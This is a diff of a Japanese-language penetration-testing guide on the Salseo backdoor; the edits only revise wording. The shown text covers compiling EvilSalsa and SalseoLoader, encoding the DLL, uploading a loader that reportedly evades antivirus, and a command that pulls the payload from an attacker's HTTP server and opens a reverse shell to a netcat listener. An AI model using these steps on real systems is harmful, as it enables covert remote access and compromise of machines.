@@ -4,13 +4,13 @@
 
 ## バイナリのコンパイル
 
-GitHubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**がインストールされている必要があります。
+GitHubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**が必要です。
 
 使用するWindowsボックスのアーキテクチャに合わせてこれらのプロジェクトをコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャ用にコンパイルしてください）。
 
 **Visual Studio**の**左側の「Build」タブ**の**「Platform Target」**で**アーキテクチャを選択**できます。
 
-(\*\*このオプションが見つからない場合は、**「Project Tab」**を押してから**「\<Project Name> Properties」**を選択してください)
+（**このオプションが見つからない場合は、**「Project Tab」**をクリックし、次に**「\<Project Name> Properties」**をクリックしてください。）
 
 ![](<../images/image (132).png>)
 
@@ -20,7 +20,7 @@ GitHubからソースコードをダウンロードし、**EvilSalsa**と**Salse
 
 ## バックドアの準備
 
-まず、**EvilSalsa.dll**をエンコードする必要があります。そのためには、Pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルできます。
+まず、**EvilSalsa.dll**をエンコードする必要があります。そのためには、Pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルします。
 
 ### **Python**
 ```
@@ -32,15 +32,15 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-わかりました、今すぐすべてのSalseoのことを実行するために必要なものがあります: **エンコードされたEvilDalsa.dll**と**SalseoLoaderのバイナリ**です。
+わかりました。Salseoのすべてを実行するために必要なものは揃っています: **エンコードされた EvilDalsa.dll** と **SalseoLoader のバイナリ** です。
 
-**SalseoLoader.exeバイナリをマシンにアップロードします。どのAVにも検出されないはずです...**
+**SalseoLoader.exe バイナリをマシンにアップロードしてください。どのAVにも検出されないはずです...**
 
 ## **バックドアを実行する**
 
-### **TCPリバースシェルを取得する（HTTPを通じてエンコードされたdllをダウンロードする）**
+### **TCP リバースシェルを取得する（HTTP 経由でエンコードされた dll をダウンロードする）**
 
-ncをリバースシェルリスナーとして起動し、エンコードされたevilsalsaを提供するHTTPサーバーを起動することを忘れないでください。
+nc をリバースシェルリスナーとして起動し、エンコードされた evilsalsa を提供する HTTP サーバーを起動することを忘れないでください。
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -97,11 +97,11 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ### **Visual Studioを終了し、DllExport_configureを実行する**
 
-ただ**終了**します
+Visual Studioを**終了**します。
 
 次に、**SalseoLoaderフォルダー**に移動し、**DllExport_Configure.bat**を実行します。
 
-**x64**を選択します（x64ボックス内で使用する場合、私のケースです）、**System.Runtime.InteropServices**を選択します（**DllExportの名前空間内**）そして**適用**を押します。
+**x64**を選択します（x64ボックス内で使用する場合、私のケースではそうでした）、**System.Runtime.InteropServices**を選択します（**DllExportの名前空間内**）そして**適用**を押します。
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
